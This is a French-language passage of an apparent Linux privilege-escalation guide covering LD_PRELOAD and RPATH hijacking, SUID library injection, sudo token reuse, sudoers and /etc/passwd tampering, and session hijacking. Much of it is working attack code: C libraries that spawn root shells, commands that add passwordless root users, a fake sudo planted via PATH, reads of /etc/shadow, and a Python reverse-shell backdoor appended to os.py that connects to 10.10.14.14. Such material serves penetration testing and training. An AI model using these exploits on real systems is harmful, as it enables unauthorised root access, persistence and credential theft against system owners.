### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** permet de spécifier une ou plusieurs bibliothèques partagées (fichiers .so) à charger par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est appelé preloading d'une bibliothèque.

Cependant, afin de préserver la sécurité du système et d'empêcher l'exploitation de cette fonctionnalité, notamment avec les exécutables **suid/sgid**, le système applique certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables dont l'ID utilisateur réel (_ruid_) ne correspond pas à l'ID utilisateur effectif (_euid_).
- Pour les exécutables avec suid/sgid, seules les bibliothèques situées dans des chemins standard et qui sont également suid/sgid sont preloadées.

Une élévation de privilèges peut se produire si vous pouvez exécuter des commandes avec `sudo` et que la sortie de `sudo -l` contient l'instruction **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être reconnue même lorsque les commandes sont exécutées avec `sudo`, ce qui peut entraîner l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrer sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite, **compilez-le** avec :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escalate privileges** en exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similaire peut être exploité si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH**, car il contrôle le chemin dans lequel les libraries seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binaire SUID – injection de .so

Lorsqu'un binaire avec des permissions **SUID** semble inhabituel, il est recommandé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère une possibilité d’exploitation.

Pour l’exploiter, il faudrait créer un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions des fichiers et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus en fichier objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l’exécution du binaire SUID affecté devrait déclencher l’exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID chargeant une bibliothèque depuis un dossier dans lequel nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom requis :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
cela signifie que la library que vous avez générée doit contenir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix pouvant être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est identique, mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet rassemble des fonctions légitimes de binaires Unix pouvant être détournées pour s'échapper de restricted shells, escalate ou conserver des privilèges élevés, transférer des fichiers, lancer des bind et reverse shells, et faciliter d'autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo.

### Réutilisation des jetons Sudo

Dans les cas où vous avez **un accès sudo**, mais pas le mot de passe, vous pouvez escalate vos privilèges en **attendant l'exécution d'une commande sudo, puis en détournant le session token**.

Conditions requises pour escalate les privilèges :

- Vous disposez déjà d'un shell en tant qu'utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose **au cours des 15 dernières minutes** (par défaut, il s'agit de la durée du sudo token qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` renvoie 0
- `gdb` est accessible (vous devez pouvoir le upload)

(Vous pouvez activer temporairement `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modifier définitivement `/etc/sysctl.d/10-ptrace.conf` et définir `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont réunies, **vous pouvez escalate vos privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le sudo token dans votre session** (vous n'obtiendrez pas automatiquement un root shell, exécutez `sudo su`) :
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **second exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **appartenant à root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **third exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend les **sudo tokens éternels** et permet à **tous les utilisateurs d’utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous disposez des **permissions d’écriture** sur le dossier ou sur l’un des fichiers créés à l’intérieur de celui-ci, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous disposez d’un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en exécutant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers présents dans `/etc/sudoers.d` configurent qui peut utiliser `sudo` et de quelle manière. Ces fichiers **ne peuvent par défaut être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n'importe quel fichier, vous pourrez **escalader les privilèges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez exploiter cette permission.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre manière d'exploiter ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo`, comme `doas` pour OpenBSD. N'oubliez pas de vérifier sa configuration dans `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Si `doas` autorise un éditeur ou un interpréteur, vérifiez les échappements de type GTFOBins :
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour escalader ses privilèges et que vous avez obtenu un shell dans le contexte de cet utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root, puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que, lorsque l'utilisateur exécute sudo, votre exécutable sudo soit exécuté.

Notez que si l'utilisateur utilise un shell différent (et non bash), vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous trouverez un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Généralement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** dans lesquels les **bibliothèques** seront **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera les bibliothèques dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur dispose de permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier situé dans `/etc/ld.so.conf.d/` ou n'importe quel dossier indiqué dans le fichier de configuration contenu dans `/etc/ld.so.conf.d/*.conf`, il pourrait être en mesure d'escalader ses privilèges.\
Consultez **comment exploiter cette mauvaise configuration** dans la page suivante :


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la bibliothèque dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement, comme indiqué dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Créez ensuite une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Les capabilities Linux fournissent **un sous-ensemble des privilèges root disponibles à un processus**. Cela décompose effectivement les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette manière, l’ensemble complet des privilèges est réduit, ce qui diminue les risques d’exploitation.\
Consultez la page suivante pour **en savoir plus sur les capabilities et sur la manière de les exploiter**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit « execute »** implique que l’utilisateur concerné peut faire un "**cd**" dans le dossier.\
Le bit **« read »** implique que l’utilisateur peut **lister** les **fichiers**, tandis que le bit **« write »** implique que l’utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Les listes de contrôle d’accès (ACLs) représentent la couche secondaire des permissions discrétionnaires, capable de **remplacer les permissions ugo/rwx traditionnelles**. Ces permissions améliorent le contrôle de l’accès aux fichiers ou aux répertoires en permettant ou en refusant des droits à des utilisateurs spécifiques qui ne sont pas propriétaires ou membres du groupe. Ce niveau de **granularité garantit une gestion plus précise des accès**. Vous trouverez plus de détails [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Donner** à l’utilisateur "kali" les permissions de lecture et d’écriture sur un fichier:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenir** des fichiers avec des ACL spécifiques sur le système :
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ACL cachée dans les fichiers sudoers

Une mauvaise configuration courante consiste en un fichier appartenant à root dans `/etc/sudoers.d/`, avec le mode `440`, qui accorde malgré tout un accès en écriture à un utilisateur non privilégié via une ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Si vous voyez quelque chose comme `user:alice:rw-`, l’utilisateur peut ajouter une règle sudo malgré des bits de mode restrictifs :
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Il s’agit d’une voie de persistence/privesc ACL à fort impact, car elle est facile à manquer lors des revues limitées à `ls -l`.

## Sessions shell ouvertes

Dans les **anciennes versions**, vous pouvez **hijack** certaines sessions **shell** d’un autre utilisateur (**root**).\
Dans les **versions les plus récentes**, vous pourrez **vous connecter** aux sessions screen uniquement de votre **propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes à l’intérieur de la session**.

### screen sessions hijacking

**Lister les sessions screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Emplacements des sockets (certains systèmes exposent l'un comme un lien symbolique vers l'autre) : ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**S'attacher à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Détournement de sessions tmux

Ce problème concernait les **anciennes versions de tmux**. Je n'ai pas réussi à détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Emplacements des sockets (certains systèmes en exposent un sous forme de symlink de l’autre) - tmux sessions hijacking : tmux -S /tmp/dev sess ls Liste avec ce socket, vous pouvez démarrer une session tmux sur ce socket...](<../../images/image (837).png>)

**S’attacher à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Consultez **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Toutes les clés SSL et SSH générées sur des systèmes basés sur Debian (Ubuntu, Kubuntu, etc.) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bug.\
Ce bug est causé par la création d'une nouvelle clé SSH sur ces OS, car **seulement 32 768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et qu'**avec la clé publique SSH, vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici : [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valeurs de configuration SSH intéressantes

- **PasswordAuthentication:** indique si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** indique si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: lorsqu'une authentification par mot de passe est autorisée, indique si le serveur permet la connexion aux comptes dont le mot de passe est vide. La valeur par défaut est `no`.

### Fichiers de contrôle de connexion

Ces fichiers influencent les personnes pouvant se connecter et la manière dont elles peuvent le faire :

- **`/etc/nologin`**: s'il est présent, bloque les connexions des utilisateurs autres que root et affiche son message.
- **`/etc/securetty`**: limite les endroits depuis lesquels root peut se connecter (liste blanche des TTY).
- **`/etc/motd`**: bannière affichée après la connexion (peut leak des informations sur l'environnement ou la maintenance).

### PermitRootLogin

Indique si root peut se connecter via SSH ; la valeur par défaut est `no`. Valeurs possibles :

- `yes`: root peut se connecter avec un mot de passe et une clé privée
- `without-password` ou `prohibit-password`: root peut uniquement se connecter avec une clé privée
- `forced-commands-only`: root peut se connecter uniquement avec une clé privée et si les options de commandes sont spécifiées
- `no` : aucune connexion

### AuthorizedKeysFile

Indique les fichiers contenant les clés publiques pouvant être utilisées pour l'authentification des utilisateurs. Il peut contenir des tokens tels que `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs au répertoire personnel de l'utilisateur**. Par exemple :
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **privée** de l’utilisateur "**testusername**", ssh comparera la clé publique de votre clé avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Le transfert de l’agent SSH vous permet **d’utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrases secrètes !) sur votre serveur. Vous pourrez donc **rebondir** via ssh **vers un hôte**, puis **rebondir vers un autre** hôte **en utilisant** la **clé** située sur votre **hôte initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme suit :
```
Host example.com
ForwardAgent yes
```
Notez que si `Host` est `*`, chaque fois que l’utilisateur se connecte à une autre machine, cet hôte pourra accéder aux clés (ce qui constitue un problème de sécurité).

Le fichier `/etc/ssh_config` peut **remplacer ces options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser ou refuser** le forwarding de `ssh-agent` avec le mot-clé `AllowAgentForwarding` (autorisé par défaut).

Si vous constatez que le Forward Agent est configuré dans un environnement, consultez la page suivante, car **vous pourriez être en mesure de l’exploiter pour augmenter vos privilèges** :


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers situés sous `/etc/profile.d/` sont des **scripts exécutés lorsqu’un utilisateur ouvre un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l’un d’eux, vous pouvez augmenter vos privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil inhabituel est trouvé, vous devez le vérifier pour y rechercher des **informations sensibles**.

### Fichiers Passwd/Shadow

Selon l'OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent utiliser un nom différent ou avoir une copie de sauvegarde. Il est donc recommandé de **tous les trouver** et de **vérifier si vous pouvez les lire** afin de voir **s'ils contiennent des hashes** :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certains cas, vous pouvez trouver des **hashes de mots de passe** dans le fichier `/etc/passwd` (ou équivalent).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd modifiable

Tout d’abord, générez un mot de passe avec l’une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ajoutez ensuite l'utilisateur `hacker` et ajoutez le mot de passe généré.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Par exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Vous pouvez également utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
AVERTISSEMENT : vous pourriez dégrader la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE : Sur les plateformes BSD, `/etc/passwd` se trouve dans `/etc/pwd.db` et `/etc/master.passwd`. De plus, `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration d'un service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** vous pouvez modifier les lignes suivantes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécutée au prochain démarrage de tomcat.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacements étranges/fichiers détenus
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés au cours des dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers de bases de données SQLite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fichiers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/binaires dans le PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser à cette fin est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne), une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local sous Windows, Linux et Mac.

### Journaux

Si vous pouvez lire les journaux, vous pourrez peut-être y trouver des **informations intéressantes/confidentielles**. Plus le journal est étrange, plus il sera intéressant (probablement).\
De plus, certains **journaux d’audit** mal configurés (avec une backdoor ?) peuvent vous permettre **d’enregistrer des mots de passe** dans les journaux d’audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour pouvoir **lire les logs, le groupe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Fichiers Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Recherche générique de creds/Regex

Vous devriez également rechercher les fichiers contenant le mot "**password**" dans leur **nom** ou dans leur **contenu**, ainsi que les IP et les adresses e-mail dans les logs, ou les regexps de hash.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse, vous pouvez consulter les dernières vérifications effectuées par [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fichiers inscriptibles

### Python library hijacking

Si vous savez **depuis où** un script Python va être exécuté et que vous **pouvez écrire dans** ce dossier ou **modifier des Python libraries**, vous pouvez modifier la library de l'OS et la backdoorer (si vous pouvez écrire à l'endroit où le script Python va être exécuté, copiez-collez la library os.py).

Pour **backdoorer la library**, ajoutez simplement la ligne suivante à la fin de la library os.py (modifiez l'IP et le PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de logrotate

Une vulnérabilité dans `logrotate` permet potentiellement aux utilisateurs disposant de **permissions d’écriture** sur un fichier journal ou ses répertoires parents d’obtenir des privilèges élevés. Cela est dû au fait que `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_, mais aussi dans tout répertoire où la rotation des journaux est appliquée.

> [!TIP]
> Cette vulnérabilité affecte la version `3.18.0` et les versions antérieures de `logrotate`

Des informations plus détaillées sur la vulnérabilité sont disponibles sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx)**. Ainsi, chaque fois que vous découvrez que vous pouvez modifier des journaux, vérifiez qui les gère et si vous pouvez escalader vos privilèges en remplaçant les journaux par des liens symboliques.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour quelque raison que ce soit, un utilisateur peut **écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** modifier un script existant, alors votre **system is pwned**.

